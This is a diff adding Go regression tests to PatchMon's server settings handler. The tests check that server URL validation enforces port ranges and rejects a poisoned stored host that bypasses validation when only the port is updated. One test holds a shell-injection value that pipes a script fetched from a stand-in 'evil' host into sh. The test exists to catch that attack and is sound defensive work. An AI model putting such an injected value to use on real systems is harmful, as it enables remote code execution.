@@ -3,6 +3,8 @@ package handler
 import (
 	"strings"
 	"testing"
+
+	"github.com/PatchMon/PatchMon/server-source-code/internal/models"
 )
 
 // TestValidateServerURL_RejectsShellInjection is the regression guard for the
@@ -164,5 +166,88 @@ func TestConstructServerURL_OutputStaysSafe(t *testing.T) {
 			t.Errorf("constructServerURL(%q,%q,%d) = %q which fails validation: %v",
 				tc.proto, tc.host, tc.port, got, err)
 		}
+	}
+}
+
+// TestValidateServerURL_BoundsPort keeps validateServerURL consistent with
+// validateServerURLParts. url.Parse does not range-check the port unless asked.
+func TestValidateServerURL_BoundsPort(t *testing.T) {
+	t.Parallel()
+
+	for _, raw := range []string{
+		"http://a.com:99999999999999999999",
+		"http://a.com:0",
+		"http://a.com:65536",
+	} {
+		if err := validateServerURL(raw); err == nil {
+			t.Errorf("server URL %q must be rejected on its port", raw)
+		}
+	}
+	for _, raw := range []string{
+		"http://a.com:1",
+		"http://a.com:65535",
+		"https://a.com:8443",
+	} {
+		if err := validateServerURL(raw); err != nil {
+			t.Errorf("server URL %q must be accepted, got %v", raw, err)
+		}
+	}
+}
+
+// TestDerivedServerURLIsValidated is the regression guard for the composition
+// bypass found in review.
+//
+// validateServerURLParts only inspects the fields present in the current
+// request, but constructServerURL builds the URL from a MIX of new and stored
+// values. A request supplying only server_port therefore composed itself with a
+// stored server_host that the validator never saw. This asserts the derived
+// value is itself validated, using a stored host that could only have been
+// written before that validation existed.
+func TestDerivedServerURLIsValidated(t *testing.T) {
+	t.Parallel()
+
+	poisoned := `evil.com";curl http://evil/x|sh;#`
+
+	// Sanity: the composed URL really is hostile, so the test is not vacuous.
+	composed := constructServerURL("http", poisoned, 443)
+	if err := validateServerURL(composed); err == nil {
+		t.Fatalf("expected the composed URL %q to be hostile", composed)
+	}
+
+	s := &models.Settings{
+		ServerProtocol: "http",
+		ServerHost:     poisoned, // written before validation existed
+		ServerPort:     3001,
+		ServerURL:      "http://old.example.com:3001",
+	}
+	// Only the port is supplied, so validateServerURLParts never sees the host.
+	req := map[string]interface{}{"server_port": float64(443)}
+
+	err := applySettingsUpdate(s, req, nil)
+	if err == nil {
+		t.Fatal("a derived URL built from a poisoned stored host must be rejected")
+	}
+	if s.ServerURL != "http://old.example.com:3001" {
+		t.Errorf("settings must be left untouched on rejection, ServerURL is now %q", s.ServerURL)
+	}
+}
+
+// TestApplySettingsUpdate_AcceptsLegitimateDerivation guards against
+// over-rejecting the ordinary path.
+func TestApplySettingsUpdate_AcceptsLegitimateDerivation(t *testing.T) {
+	t.Parallel()
+
+	s := &models.Settings{
+		ServerProtocol: "http",
+		ServerHost:     "patchmon.example.com",
+		ServerPort:     3001,
+	}
+	req := map[string]interface{}{"server_protocol": "https", "server_port": float64(8443)}
+
+	if err := applySettingsUpdate(s, req, nil); err != nil {
+		t.Fatalf("a legitimate update must be accepted, got %v", err)
+	}
+	if s.ServerURL != "https://patchmon.example.com:8443" {
+		t.Errorf("unexpected derived URL %q", s.ServerURL)
 	}
 }
